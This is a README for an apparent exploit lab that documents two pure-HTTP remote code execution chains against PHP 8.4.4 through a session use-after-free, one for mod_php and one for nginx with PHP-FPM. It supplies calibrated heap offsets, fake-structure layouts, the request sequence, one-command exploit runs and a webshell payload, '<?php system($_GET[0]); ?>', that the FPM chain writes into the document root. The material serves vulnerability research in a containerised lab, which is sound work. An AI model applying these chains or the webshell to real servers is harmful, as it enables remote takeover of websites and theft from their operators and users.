# PHP2Shell — session UAF → pure-HTTP RCE on PHP 8.4.4 (mod_php and nginx + PHP-FPM)

English | [中文](README.md)

One vulnerability, two chains, two SAPIs, two calibrations:

| chain | victim shape | how code executes | PoC |
| --- | --- | --- | --- |
| mod_php | Apache 2.4.58 prefork + `libphp.so`, page is a bare `echo` | dangling `zend_reference` → fake `HashTable` with `pDestructor = zif_system`, the last request calls `system()` | `exploits/def_rce.py` and 3 more |
| nginx + PHP-FPM | nginx 1.24 + `php-fpm` compiled here (`pm = static`, 1 child), page calls `session_start()` | the dangling `BG(unserialize)` decoder rewrites where the session gets written, so the FPM worker **itself** writes a session file full of PHP code into the document root → arbitrary file write → request it | `exploits/fpm_rce.py` |

Neither chain needs an exploit class or a helper endpoint, neither changes the
victim's PHP code, neither needs a rebuild or gdb on the target, ASLR is fully
enabled in both, and every byte on the wire is plain HTTP.

**The mod_php chain's** whole attack surface is these 22 bytes:

```php
<?php echo "OK\n"; ?>
```

No `session_start()` required.  The heap base and the `libphp.so` base come back
in a `Set-Cookie` header, and the final request turns a dangling
`zend_reference` into a call to `zif_system`.

**The FPM chain** needs no code pointer and therefore no `libphp` leak; in
exchange the victim page really has to call `session_start()` and the document
root has to be writable.

Verified targets: our own `PHP 8.4.4-dev` build (Ubuntu 24.04; mod_php via the
prebuilt `libphp.so` md5 `f402b493b1df82cbf34021b4aef133cb`, shipped in the image
so the calibration and the binary always agree; php-fpm compiled on demand by
`build-phpfpm.sh`, md5 `4b6b73a350e09fcc791c0f20a95ca7d0`).

> **This is derivative work.**  The mod_php chain, its stage structure and the
> reference implementation come from
> [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp),
> and the direction of the FPM chain comes from the Calif Research php2shell
> write-up — see [Acknowledgements](#acknowledgements) and
> [What we added over the reference chain](#what-we-added-over-the-reference-chain).

## Quick start

```bash
python p2s.py build            # docker build (apt from the USTC mirror by default)
                               # add --from-source to compile mod_php first
python p2s.py up               # create + start all 14 mod_php target containers
python p2s.py verify           # served page, expose_php, libphp offsets, worker count
python p2s.py offsets          # zif_system / zval_ptr_dtor of the running target
python p2s.py exploit off      # run the PoC against one profile -> PROOF: uid=33(www-data)
python p2s.py prune            # recycle lab state: session files + proof files
python p2s.py down             # remove the containers

python p2s.py fpm-build        # second chain: compile sapi/fpm from the same php-src
python p2s.py fpm-up           # nginx + php-fpm container on 127.0.0.1:8112
python p2s.py verify fpm       # page content, fpm version, writable docroot, memory_limit
python p2s.py exploit fpm      # run the FPM chain -> PROOF: uid=33(www-data)
python p2s.py prune fpm        # delete session files + the shell the chain wrote
python p2s.py fpm-down
```

`build` once, then `exploit <profile>` alone is enough: it re-creates a missing
container by itself (`ensure`), cleans stale session/proof files before and after
the run, prints the PoC output and exits non-zero when no proof was produced.
A 128M mod_php run takes ~8 s end to end, the FPM chain ~11.6 s (measured
2026-10-23).  `exploit`/`verify`/`prune` all accept the name `fpm`, and `-c '…'`
works there too.

Useful knobs (env):

| var | default | meaning |
| --- | --- | --- |
| `APT` | `cn` | `cn` = rewrite sources to the mirror, `off` = keep image sources, `skip` = no apt at all |
| `APT_MIRROR` | `mirrors.ustc.edu.cn` | mirror used when `APT=cn` |
| `BASE` | `ubuntu:24.04` | base image |
| `P2S_CLEAN` | `1` | set `0` to keep session/proof files after a run |
| `FPM_PORT` | `8112` | host port of the nginx + PHP-FPM target |
| `CMD` via `exploit <p> -c '…'` | `id>/srv/out/pd` (`id` for `fpm`) | command to run; for mod_php the proof path follows the `>/srv/out/<file>` redirect, for `fpm` the output is saved to `out-fpm/pfpm` |

## What the lab is

```
p2s.py                  one-click driver (build/up/down/status/verify/offsets/exploit/prune
                        + fpm-build/fpm-up/fpm-down)
docker/
  Dockerfile            ubuntu:24.04 + apache2 runtime libs + prebuilt libphp.so (mod_php)
  Dockerfile.fpm        ubuntu:24.04 + nginx + /opt/phpfpm (FPM chain)
  Dockerfile.builder    optional: build deps for `build --from-source` / `fpm-build`
  build-libphp.sh       the php-src 8.4.4 mod_php compile script that runs in it
  build-phpfpm.sh       the php-src 8.4.4 sapi/fpm compile script that runs in it
  offsets.py            nm reader: writes env/generated/offsets.env for the PoCs
  bin/libphp.so         the PHP 8.4.4-dev build the offsets were calibrated on
  bin/opcache.so        only used by the `opc` profile
  src/php-src-844.tar   matching PHP source, for rebuilding (136 MB, not needed to run)
  www/index.php         the mod_php victim page — 22 bytes, see the gotcha below
  fpm/nginx.conf        FPM chain: nginx in front, root /srv/www, .php → 127.0.0.1:9000
  fpm/php-fpm.conf      `pm = static`, one child, www-data
  fpm/php.ini           `memory_limit = 8M`, upload_progress On, writable save_path
  fpm/www/index.php     the FPM victim page: `<?php session_start(); echo "OK\n"; ?>`
  fpm/www/plain.php     bare `echo` page, used for shaping requests and liveness
  entrypoint.sh         mkdir /srv/out, then `apache2 -f /srv/profile/apache.conf`
  entrypoint-fpm.sh     start php-fpm, then `exec nginx -g 'daemon off;'`
env/gen_profiles.py     single source of truth for the 14 profiles -> env/generated/<name>/
exploits/               the PoCs (self-contained, no absolute host paths)
  exploit.py            the reference chain, vendored from 9bie/php2shell-bypass-aslr-exp
  worker.py             docker-exec helpers: container name, port, out dir, worker reset
  def_rce.py            display_errors=Off chain (128M/256M/512M/1G, expose_php both)
  default_rce.py        display_errors=On + expose_php=Off chain
  dev_on_rce.py         display_errors=On + expose_php=On  (cookie-warning leak + On stage3)
  dev_off_rce.py        display_errors=On + expose_php=Off with a long command
                        (also what the opcache profile uses, via CMDOFF)
  fpm_rce.py            nginx + PHP-FPM chain (dangling BG(unserialize) → file write)
measure/                calibration & gdb helpers (not needed for a plain run)
  exploit drivers       measure_dd_any.py, mw_full_test.py, measure_s3_formfill.py,
                        measure_loaded_worker.py, dev_r0.py (re-measure R0)
  gdb/gdb-*.py          psdump, s3trace, heapstat, trigger — loaded by those drivers
tools/probe.php         optional in-webroot probe (loaded ini, directives, extensions)
```

Per profile, `env/generated/<name>/` holds `php.ini`, `apache.conf`, `port`.
`p2s.py` mounts that directory twice — at `/srv/profile` (for Apache) and at
`/usr/local/etc/php` (libphp's compiled-in ini path, which is where PHP actually
reads the ini) — plus `docker/www` at `/srv/www` and `out-<name>/` at `/srv/out`.
One container per profile, all published on `127.0.0.1` only.

The FPM chain has one container, `p2s-fpm`: nginx (:80 → host `FPM_PORT`, 8112 by
default) and php-fpm (container `127.0.0.1:9000`) in the same image, configured
straight from `docker/fpm/`, with `docker/fpm/www` mounted at `/srv/www`
**writable** (the chain writes there) and `out-fpm/` at `/srv/out`.  It is not
part of the 14 profiles: `fpm-up`/`fpm-down` manage it, and `status` adds a row
for it while it is alive.

## Profiles and which PoC fits

| alias | container | port | memory_limit | display_errors | expose_php | save_path | workers | opcache | PoC |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| `off` | p2s-def | 8098 | 128M | Off | Off | /tmp | 1 | – | `exploits/def_rce.py` |
| `on` | p2s-on | 8099 | 128M | Off | On | /tmp | 1 | – | `exploits/def_rce.py` |
| `default` | p2s-default | 8096 | 128M | On | Off | /tmp | 1 | – | `exploits/default_rce.py` |
| `dev` | p2s-dev | 8102 | 128M | On | On | /tmp | 1 | – | `exploits/dev_on_rce.py` |
| `ub` | p2s-ub | 8103 | 128M | Off | Off | /var/lib/php/sessions | 1 | – | `exploits/def_rce.py` |
| `ub-on` | p2s-ub-on | 8104 | 128M | Off | On | /var/lib/php/sessions | 1 | – | `exploits/def_rce.py` |
| `off256` | p2s-256 | 8105 | 256M | Off | Off | /tmp | 1 | – | `exploits/def_rce.py` |
| `off512` | p2s-512 | 8106 | 512M | Off | Off | /tmp | 1 | – | `exploits/def_rce.py` |
| `off1g` | p2s-1g | 8107 | 1G | Off | Off | /tmp | 1 | – | `exploits/def_rce.py` |
| `dd256` | p2s-dd256 | 8108 | 256M | On | Off | /tmp | 1 | – | `measure/measure_dd_any.py` |
| `dd512` | p2s-dd512 | 8109 | 512M | On | Off | /tmp | 1 | – | `measure/measure_dd_any.py` |
| `dd1g` | p2s-dd1g | 8110 | 1G | On | Off | /tmp | 1 | – | `measure/measure_dd_any.py` |
| `mw` | p2s-mw | 8100 | 128M | Off | Off | /tmp | 8 | – | `measure/mw_full_test.py` (fan-out) |
| `opc` | p2s-opc | 8111 | 128M | On | Off | /tmp | 1 | On | `exploits/dev_off_rce.py` + `CMDOFF=0x7a118` |
| `fpm` | p2s-fpm | 8112 | 8M | Off | On | /var/lib/php/sessions | 1 (static) | – | `exploits/fpm_rce.py` |

The first 14 rows are mod_php profiles; the last one is the nginx + PHP-FPM
chain (`sapi=fpm`), managed by `fpm-build`/`fpm-up` on its own.

The mod_php profiles all serve the same 22-byte victim page.  `exploit <alias>`
picks the PoC, the heap calibration (`PROFILE`) and the proof path for you;
`-s <script>` overrides the script, `-c` the command, a trailing number sets the
fan-out width for `mw` (default: the profile's `MaxRequestWorkers`).
`exploit fpm` takes `-c` as well and saves its proof to `out-fpm/pfpm`.

Verified in this tree on 2026-10-23: `p2s.py verify` is green for all 14 mod_php
containers, and one back-to-back sweep of `exploit` produced
`PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)` for every profile —
`off`, `on`, `default`, `dev`, `ub`, `ub-on`, `off256`, `off512`, `off1g`, `dd256`,
`dd512`, `dd1g`, `opc`, `mw` (fan-out over all 8 prefork children).
For the FPM chain, `php-fpm` is compiled by `fpm-build` (it links only libc/libm)
and `exploit fpm` produced `uid=33(www-data)` on three independent runs — fresh,
immediately re-run, and after `docker restart p2s-fpm` (a whole new ASLR set) —
each in ~11.6 s.

## What we added over the reference chain

The reference chain as published in
[9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)
runs A1 → B1 → A2 → B2 against PHP 8.4.26 NTS on Debian 13 / Apache 2.4.69 with the
stock `php.ini-production`: `display_errors=Off`, `memory_limit=128M`, one prefork
worker, `<?php echo "OK\n"; ?>` as the only victim code, ~2 s per run.  That is the
baseline; the table below is what this tree changes, with the profile that proves it.

| pain point on the reference chain | here | evidence |
| --- | --- | --- |
| the OOM has to land in the cookie `php_url_encode()` path, i.e. `display_errors=Off` | a second producer: 1001 cookies trip the `max_input_vars` warning, the printed warning sets `headers_sent`, `php_session_send_cookie()` fails and a plain body fill OOMs in `multipart_buffer_read_body` — so `display_errors=On` works too, and needs no page-level calibration | `default`, `dev`, `dd256/512/1g`, `opc` |
| `memory_limit` must stay 128M | 128M / 256M / 512M / 1G, on both producers | `off256`, `off512`, `off1g`, `dd256`, `dd512`, `dd1g` |
| single-worker prefork (multi-worker explicitly deferred upstream) | one stage-A/B pair per prefork child, fanned out over the pool; all children inherit the parent's chunk and `libphp` bases from `fork()`, so a single leak serves the whole pool | `mw` (8 children, all 8 stage-B requests executed) |
| one `expose_php` layout | both: `R0 = chunk+0x68140` (Off) and `chunk+0x752E0` (On) | `on`, `dev`, `ub-on` |
| one `session.save_path` layout | the path length only shifts `R0` by `0x20`, so the carrier places two adjacent fake references and covers a short and a long path in one request | `ub`, `ub-on` (`/var/lib/php/sessions`) |
| opcache not covered | works under opcache (the carrier moves to `CMDOFF=0x7a118`, selected automatically for that profile) | `opc` |
| the command lives inside a small live `zend_string` (14 bytes; longer work goes through a two-step `sh</out/c`) | a separate 3100-byte `CMD` field carries an external fake `zend_string` (up to ~1.7 KB, shell metacharacters included) and the fake `execute_data` arg1 points at it — one request, no staging file | `dev_off_rce.py`, `opc` |
| "a different PHP build or version means re-calibrating the offsets", with the tooling outside the delivery | the re-measurement is part of the lab: `p2s.py offsets` reads `zif_system`/`zval_ptr_dtor` out of the running target into `env/generated/offsets.env` and `exploit` injects them as `ZIF_OFF`/`DTOR_OFF`; `R0_OFF`, `CMDOFF`, `NFILL/FILLSZ/S3_BIGLEN`, `BURN_SPEC/TAIL*` are all env-overridable; `measure/dev_r0.py` + `measure/gdb/` show how each constant is obtained | Rebuilding the victim binary, below |
| the target binary is whatever the official image ships | `build --from-source` compiles mod_php from php-src, so a clone that does not carry the 53 MB blob is self-sufficient | see the experiment below |
| delivery is `run_pure.sh` + one `exploit.py` | 14 profiles × one command, `verify`/`status`/`offsets`/`prune`, proof-script pairing, container self-healing after an external `docker prune`, bilingual README | Quick start, Recycling |
| one SAPI only (mod_php) | a second chain through PHP-FPM, which is a completely different SAPI path: the pre-RINIT dangling `BG(unserialize)` decoder rewrites the session write target, so no code pointer and no `libphp` leak are needed at all | `fpm`, The chain (2) below |

## The chain (1) — mod_php

Two requests per stage, all multipart/form-data with chunked bodies.

**Stage 1 — create the dangling state.**  `memory_limit` is reached *inside*
request startup, after the session has been initialised but before
`php_request_shutdown`, so the worker keeps pointers into memory that is handed
back to the allocator.  Two producers:

* `display_errors=Off` (`def_rce`): the OOM happens while `php_url_encode()`
  escapes the session id for the `Set-Cookie` header, because `send_cookie` is
  still 1.  Reaching it needs the whole heap saturated to the exact page
  (`BURN_SPEC` dense `filename=""` uploads + `TAILB/TAILC/TAILD/BIGTAIL/…` fill),
  which is why this chain carries per-`memory_limit` calibration.
* `display_errors=On` (`default_rce`, `measure_dd_any`): 1001 cookies trip the
  `max_input_vars` warning, the printed warning sets `headers_sent`, so
  `php_session_send_cookie()` fails and `php_session_track_init()` is skipped —
  and a plain fill (`N x 4MB` form fields + one huge field) OOMs in
  `multipart_buffer_read_body`.  No page-level calibration: only the fill size
  scales with the limit.

**Stage 1 leak.**  A forged `zend_string` header is placed on a page the stale
`PS(id)` still points at, with `len = 0x4000`/`0x40000`; the next request's
`Set-Cookie: PHPSESSID=…` returns up to 256 KB of heap.  The dominant 2 MB-aligned
base in it is the Zend MM main chunk, and every qword congruent to
`zval_ptr_dtor` gives the (ASLR-free) `libphp.so` base — 31 matching qwords in a
normal run, checked against `/proc/1/maps`.

**Stage 3 — code execution.**  Request A repeats the producer with
`PHPSESSID=bbbb…` and `PHP_SESSION_UPLOAD_PROGRESS`, so
`php_session_track_init()` allocates the session's `zend_reference` at a known
chunk offset (`R0`) and the request then dies leaving `PS(http_session_vars)`
dangling.  Request B sprays a value that lands exactly on `R0` and contains a
fake `zend_reference` (`rc=1`, `type=0x1a`) whose `val.value` is a fake
`HashTable` at `R0+0x28` with `pDestructor = zif_system`.  `zend_reference_destroy`
→ `zend_array_destroy` → `zend_hash_destroy` → `system(cmd)`.

`session.save_path` length only shifts `R0` by `0x20`, so the carrier places two
adjacent fake references and covers both classes (`/tmp` vs a long path) in one
request.  The command is not a 14-byte inline string: a separate 3100-byte `CMD`
field carries an external fake `zend_string` (up to ~1.7 KB, shell metacharacters
included) and the fake `execute_data` arg1 points at it.

## The chain (2) — nginx + PHP-FPM

This chain borrows nothing from mod_php's request-startup bailout and uses no code
pointer.  The goal is different: make the FPM worker **write the session file
itself** into the document root.  The reason it is available on FPM and not on
mod_php is ordering — `php_request_startup()` calls `sapi_activate()`
(`main/main.c:1835`), and `sapi_activate()` already reads the body
(`main/SAPI.c:469`), so the multipart callback
`php_session_rfc1867_callback` → `php_session_initialize()` → `s_read` →
`php_session_decode()` all runs *before* any module RINIT.  The memset that clears
`BG(unserialize)` lives in `PHP_RINIT_FUNCTION(basic)`
(`ext/standard/basic_functions.c:407`) and only runs at
`zend_activate_modules()` — i.e. after that decode.  So FPM hands this chain
something mod_php never does: a dangling decoder that survives across requests.

`exploits/fpm_rce.py` sends five kinds of requests and walks the decoder towards
the session writer in three decode steps:

1. **R1 — turn the payload into a session key.**  An upload request carrying
   `PHP_SESSION_UPLOAD_PROGRESS=<?php system($_GET[0]); ?>` makes PHP store that
   string as a session key in `sess_scal`; the 890 depth-60 nested fields right
   behind it OOM the parser before the `session.upload_progress.cleanup` END
   cleanup can delete it, so the file on disk keeps
   `upload_progress_<?php system($_GET[0]); ?>|i:0;`.
2. **prime — leave the decoder dangling.**  `build_A()` first fills `sess_asx`
   with 73 progress records plus one record whose filename is 1 MB (again dodging
   cleanup with a nested wall), then POSTs `/index.php` (the page that really
   calls `session_start()`).  The pre-RINIT `php_session_decode()` hits the 8M
   limit inside `php_var_unserialize()`; `zend_catch` runs
   `php_session_cancel_decode()` and `zend_bailout()`
   (`ext/session/session.c:274`), so `PHP_VAR_UNSERIALIZE_DESTROY()` never runs.
   The request dies; the process-global `BG(unserialize)` keeps pointing at
   `var_entries` / `var_dtor_entries` blocks that the allocator already reclaimed.
3. **R2a/R2b/R3 — a count-controlled 8-byte write.**  The next progress request's
   `BIG` field re-occupies exactly those chunk pages (`E_OFF = 0x76000` is the
   fake entries block, `DT_OFF = 0xDC000` the fake dtor block), so the block
   contents the decoder reads are the request body.  `var_push()` does
   `var_hash->data[used_slots++] = rval`
   (`ext/standard/var_unserializer.re:132`); the block base is `E_OFF` and
   `data[0]` sits at `E_OFF+16`, so setting `used_slots = N` selects "the next
   push writes to `E_OFF + 16 + 8N`", and a negative `used_slots`
   (`LAST_DELTA = -0x3BD0`) aims backwards.
   * R2a: `chunk+0x63058` — the type_info half of the
     `php_session_rfc1867_progress::data` zval (`data` starts at struct offset
     0x50 and the block is at `0x63000`, checked with `gdb -ex 'ptype /o'` in the
     container), which scalarizes the progress array.
   * R2b: `chunk+0x63050` — the value half of the same zval, pointed at a fake
     8-slot array.
   * R3: negative `used_slots` lands the push at `chunk+0x58190`
     (= `E_OFF+16 + 8*LAST_DELTA`, in the session-write plumbing), while the same
     request's fake dtor block carries the count `19` and the bytes
     `"/srv/www/shell.php"` — the decoder takes those as the write target.
4. **The write happens on the victim's side.**  At the end of that same request,
   `php_session_rfc1867_update()` → `php_session_flush()` → `ps_files_write()`
   (`ext/session/mod_files.c:227`) flushes the session: not to
   `/var/lib/php/sessions/sess_scal` any more, but to `shell.php` inside the
   document root.
5. **Execution.**  `GET /shell.php?0=id` — the file *is* the session file, PHP
   consumes the `<?php … ?>` tag and runs it, and the command output comes back
   between the payload key and the next record.

The 502/500 on the shaping requests (steps 1-2) is by design: the OOM kills the
worker and FPM forks a replacement, while the process-global `BG(unserialize)` and
the chunk layout stay put.  The whole chain takes ~11.6 s.

## Constants

| item | value |
| --- | --- |
| `zif_system` | `libphp + 0x457FE0` |
| `zval_ptr_dtor` | `libphp + 0x64B890` |
| `R0` (expose_php=Off) | `chunk + 0x68140` |
| `R0` (expose_php=On) | `chunk + 0x752E0` |
| fake HashTable | `R0 + 0x28` (or the fixed `CMD` copy at `chunk + CMDOFF + 0x700`) |
| `CMDOFF` | `0x83118` Off, `0x84118` On, `0x7a118` under opcache |
| chunk size | `0x200000` (`ZEND_MM_CHUNK_SIZE`) |

### Constants (FPM chain)

| item | value | note |
| --- | --- | --- |
| `E_OFF` | `chunk + 0x76000` | stale `var_entries` block (= filler page 118, `ENTPAGE`) |
| `DT_OFF` | `chunk + 0xDC000` | stale `var_dtor_entries` block (= filler page 220, `DTPAGE`) |
| push targets | `0x63058` scalarize, `0x63050` fake array, `0x58190` session writer | `E_OFF + 16 + 8*used_slots` |
| `LAST_DELTA` | `-0x3BD0` | negative `used_slots`, aims the push backwards at `0x58190` |
| progress block | `chunk + 0x63000` | `php_session_rfc1867_progress`, 144 bytes |
| filler field | `FILLER=540672` B starting at page `FSTART=100` | the fake blocks are patched at absolute chunk offsets |
| session records | `SMALL=73` + one `FNLEN=1000000` B filename | the `build_A()` prelude of prime |
| nested walls | `NESTED=890` / prime `PRIME_NESTED=300`, `LEVELS=60` | OOM before the END cleanup |
| prime request | `FILL_FIELDS=700` × `FILL_LEN=4000` + `DUP` repeated names | hits the 8M limit |
| ini | `memory_limit=8M`, `post_max_size=8M`, upload_progress On + cleanup On | `docker/fpm/php.ini` |

Everything the PoC needs from the target is a leaked `chunk` and `libphp` base per
run, so ASLR and container restarts are irrelevant.  What is *not* portable is the
request shape: `R0`, the fill counts and `CMDOFF` are properties of this build,
this `php.ini` and this exact victim page.  `measure/` holds the gdb drivers that
produced them (`measure/gdb/gdb-psdump.py` reads the stale `PS()` globals after a
stage-A request, `measure/gdb/gdb-s3trace.py` traces
`track_init → reference_destroy → hash_destroy →
zif_system`), and `measure/dev_r0.py` shows how to re-measure `R0` for a new
layout.  `def_rce.py` accepts `BURN_SPEC/TAILB/TAILC/TAILD/DUPNAMES/CMDOFF/R0_OFF/
NFILL/FILLSZ/S3_BIGLEN` from the environment so a re-measurement does not need an
edit.

Every FPM constant is env-overridable under its own name too
(`E_OFF`/`SCALAR_PUSH`/`ARRAY_PUSH`/`LAST_DELTA`/`FILLER`/`FSTART`/`ENTPAGE`/
`DTPAGE`/`NESTED`/`PRIME_NESTED`/`LEVELS`/`SMALL`/`FNLEN`/`FILL_FIELDS`/`FILL_LEN`/
`DUP`).  And the FPM chain needs **no leak at all**: the fake blocks, the progress
struct and the writer are all addressed chunk-relatively, and the layout inside a
chunk is byte-identical after `fork()`, so a container restart with a fresh ASLR
set changes nothing (verified).

## Victim requirements

**mod_php chain.**  Hard: PHP 8.4.x mod_php (prefork), `session.upload_progress.enabled=On` and
`.cleanup=On`, `session.use_cookies=On`, `session.use_strict_mode=Off`, the `files`
save handler with a writable `save_path`, `memory_limit` reachable by the fill.
Not hard any more: `display_errors` (both), `expose_php` (both),
`session.save_path` length (both), `memory_limit` (128M/256M/512M/1G),
`max_input_vars=1000` / `max_multipart_body_parts=-1` (the shipped defaults), ASLR,
opcache (`opc` profile: the `display_errors=On` producer plus `CMDOFF=0x7a118`),
a multi-worker pool (fan-out).
Real-world blockers: traffic limits in front of Apache (the saturating
`display_errors=Off` stage-1 A has a small body, ~1–2 MB, but consumes the whole
`memory_limit` of heap; the `display_errors=On` producer instead puts the fill in
the body — ~136 MB at 128M, ~1.3 GB at 1G; `off1g`'s stage-3 A streams the same kind
of 1.3 GB fill), header-size limits that truncate the
`Set-Cookie` leak, and any heap activity between the two requests of a stage — the
two requests of one stage must hit the same child, which is why the single-worker
profiles pin `MaxRequestWorkers=1` and `mw` instead fans one copy of each stage per
pool worker (default width = the profile's `MaxRequestWorkers`, override with `MWN`
or a trailing number on the `exploit` command line).
All children are forked from one parent, so they share the same
chunk and `libphp` bases and one leak is enough.

**FPM chain.**  Hard: PHP 8.4.x **PHP-FPM** (behind nginx or an Apache proxy —
anything that parses the body inside `sapi_activate()`), a page that actually
calls `session_start()` (or any other entry into `php_session_start()`),
`session.upload_progress.enabled=On` and `.cleanup=On`, the `files` save handler,
**a document root writable by `www-data`**, and a `memory_limit` small enough for
one request to exhaust it (8M here).  This chain asks nothing of
`display_errors` or `expose_php`, uses no code pointer and needs no base leak.
Real-world blockers: the write target has to be web-reachable and writable; with
`pm.max_children` above 1 the prime and the decode requests must land on the same
worker (this tree pins `pm = static` with one child); `session.upload_progress.freq`/
`min_freq`, nginx `client_max_body_size` and similar tuning change how many shaping
requests the chain needs and how they look.

## Recycling

* `p2s.py prune [profile…]` deletes `/tmp/sess_*` and `/srv/out/*` inside each
  container and the matching host-side `out-<profile>/` files.  `exploit` does it
  before every run and clears the session files again afterwards (`P2S_CLEAN=1`),
  because stale session files make the next `s_read` OOM early and a stale proof
  makes a failure look like a success.  The proof file itself is kept as evidence.
* `p2s.py down [profile…]` removes the containers; `docker rmi p2s-php844` removes
  the image.  Nothing outside the lab directory is touched.
* `exploit`/`verify` re-create a container that vanished (external `docker prune`,
  a restarted daemon) instead of failing with a connection error.
* A stage-3 B is *expected* to kill the child: Apache's parent forks a fresh one,
  and the leaked bases stay valid because they are inherited across `fork()`.  If
  the parent itself dies, the leak is stale — `p2s.py up <profile>` before retrying.
* FPM chain: `p2s.py prune fpm` clears `/var/lib/php/sessions/sess_*` plus the
  `docker/fpm/www/shell.php` the chain wrote (the document root is a host mount, so
  the webshell survives the container — `exploit fpm` deletes it before and after).
  `fpm-down` removes the container, `docker rmi p2s-php844-fpm` the image.  Killing
  the worker during prime is expected here too; FPM replaces it immediately and both
  the stale globals and the chunk layout survive.

## Rebuilding the victim binary

Prefer the shipped `docker/bin/libphp.so`: every constant above was measured on
that exact file (md5 `f402b493b1df82cbf34021b4aef133cb`).  A fresh clone does not
carry it (53 MB), so compile it yourself instead:

```bash
python p2s.py build --from-source                  # uses docker/src/php-src-844.tar
python p2s.py build --from-source --src <php-src>  # git-archives that checkout first
```

`--from-source` builds `docker/Dockerfile.builder` (ubuntu + the `-dev` packages
the calibrated binary links against), bind-mounts the source tar into a
`p2s-srcbuild` container and runs `docker/build-libphp.sh`, then copies the result
to `docker/staged/`:

* `docker/bin/libphp.so` is absent → the new build is installed there (a backup is
  kept as `libphp.so.calibrated` when one is present).
* otherwise the calibrated binary stays; swap manually or use `--install` /
  `P2S_INSTALL=1`.
* `docker/src/php-src-844.tar` is byte-identical to `git archive HEAD` of branch
  `PHP-8.4.4`, so it never has to be committed.

`python p2s.py offsets` then reads the *symbol* offsets out of the running
container (`docker/offsets.py` → `env/generated/offsets.env`), and `exploit` picks
them up automatically through `ZIF_OFF`/`DTOR_OFF`, so `zif_system` /
`zval_ptr_dtor` need no hand-editing after a rebuild.

What a rebuild does *not* give you for free is the heap layout: `R0_OFF`, `CMDOFF`
and the fill counts are properties of the build, the `php.ini` and the victim page,
and they are only obtainable with gdb against a live child:

```bash
python measure/dev_r0.py            # -> R0_OFF; Constants above for CMDOFF/fills
python p2s.py verify && python p2s.py exploit off   # the cheap proof the constants survived
```

Measured on 2026-10-22, this tree: a `build --from-source` binary (md5
`46ab96e6f85aecac36c4c4aafd5c5cd8`, so *not* byte-identical — the build directory
and DWARF differ) keeps `zif_system=0x457fe0` and `zval_ptr_dtor=0x64b890`, and after
swapping it in, `off`, `default`, `ub` and `opc` all still produced
`PROOF: uid=33(www-data)` with the calibrated `R0=chunk+0x68140` and
`htdata=chunk+0x83818` (= `CMDOFF+0x700`).  In other words: same source, same
configure command, same package versions ⇒ the calibration survives the rebuild.
The lab is nevertheless kept on the calibrated file, because the remaining ten
profiles were not re-run against the rebuilt one.

If you compile by hand instead, use exactly this configure command (it is what the
calibrated binary was built with — `strings docker/bin/libphp.so | grep
'./configure'` reproduces it, and `php -i` inside a container shows the same):

```
'./configure' '--with-apxs2=/usr/bin/apxs2' '--with-config-file-path=/usr/local/etc/php'
  '--with-mhash' '--enable-mbstring' '--enable-mysqlnd' '--with-password-argon2' '--with-sodium'
  '--with-pdo-sqlite=/usr' '--with-sqlite3=/usr' '--with-curl' '--with-iconv' '--with-openssl'
  '--with-readline' '--with-zlib' '--enable-opcache' '--disable-cgi' '--disable-phpdbg' '--with-pic'
```

`--with-config-file-path=/usr/local/etc/php` is why `ensure`/`create` mounts the
profile directory there as well as at `/srv/profile`.  `--with-readline` links GNU
readline (`libedit-dev` would produce a different binary, and `--with-apxs2` needs
`apache2-bin` for `/usr/sbin/apache2`), and installing an extra `-dev` package
(libzip, libicu, …) silently enables an extension and moves the heap layout — the
builder image deliberately installs only what
`objdump -p docker/bin/libphp.so | grep NEEDED` asks for.

### The FPM victim

`php-fpm` is not shipped either (again a 53 MB problem); `fpm-build` compiles it
from the same php-src:

```bash
python p2s.py fpm-build                    # uses docker/src/php-src-844.tar
python p2s.py fpm-build --src <php-src>    # or a checkout / tar of your own
```

It runs `docker/build-phpfpm.sh` in the same builder image, and the configure
command is part of the calibration:

```
./configure --disable-all --enable-fpm --enable-session \
    --disable-cgi --disable-cli --disable-phpdbg --prefix=/opt/phpfpm \
    CFLAGS='-g -O0 -fPIC'
```

`--disable-all` fixes the extension set and `-O0` fixes the allocation sequence of
request startup — the FPM constants above were measured on exactly that
combination, so changing either moves the block addresses inside the chunk.  The
result is `make install`ed to `/opt/phpfpm`, archived as
`docker/staged/phpfpm.tar`, unpacked to `docker/staged/phpfpm/` and `COPY`ed
verbatim by `Dockerfile.fpm`.  This chain has nothing to read via `p2s.py offsets`
— it uses no symbol offsets, only the `E_OFF`/`DT_OFF` block addresses.

Measured on 2026-10-23, this tree: the resulting `php-fpm` (md5
`4b6b73a350e09fcc791c0f20a95ca7d0`, links only libc/libm) completed the whole FPM
chain **on the first try**, with the block offsets matching the calibration — same
conclusion as for mod_php: same source, same configure command, same package
versions ⇒ the calibration survives the rebuild.

## Gotchas that cost time

* `docker/www/index.php` must stay byte-identical to the calibrated page
  (`<?php echo "OK\n"; ?>` + newline, **22 bytes** — a real backslash, not a
  rendered newline).  Writing the file with `echo` produces a 21-byte page, the
  startup allocations shift by one byte and the `expose_php=On` stage3 silently
  stops landing on `R0`.
* With `apache2 -f <conf>`, `PHPIniDir` is ignored by this build; the ini has to
  sit at the compiled-in path, hence the double mount at `/usr/local/etc/php`.
* The image ships the prebuilt `libphp.so` because the calibrated offsets are only
  valid for a byte-identical binary; `build --from-source` is the fallback for a
  clone that has no 53 MB blob (see "Rebuilding the victim binary").
* Never attach gdb with breakpoints during a stage-A request: `SIGKILL`ing gdb
  leaves `int3` bytes in `libphp.so` (including inside the inlined
  `php_session_send_cookie`), which corrupts every later run.  Read-only batch
  probes (`-batch -p PID -x measure/gdb/gdb-psdump.py`, no breakpoints) are safe.
* In Git Bash, prefix `docker exec`/`docker cp` commands with `MSYS_NO_PATHCONV=1`
  so `/usr/...` arguments are not rewritten to Windows paths.
* 14 containers plus a 1 GB fill is a lot of VM memory; run `p2s.py up <subset>` if
  Docker Desktop starts killing containers.
* Both FPM pages are part of the calibration: `docker/fpm/www/index.php` must really
  call `session_start()` (39 bytes) and `plain.php` is the bare `echo` page
  (22 bytes) used only for shaping requests and the liveness poll.
* 502/500 from the FPM shaping requests is **expected** (the OOM kills the worker and
  FPM forks a replacement); the PoC polls `/plain.php` until it answers 200 again
  before continuing.  Do not read those status codes as a failure.
* The FPM chain needs a writable document root, so `docker/fpm/www` is mounted
  read-write and the `shell.php` it produces lands back on the host — `prune fpm`
  (and the before/after cleanup inside `exploit fpm`) is what removes it.
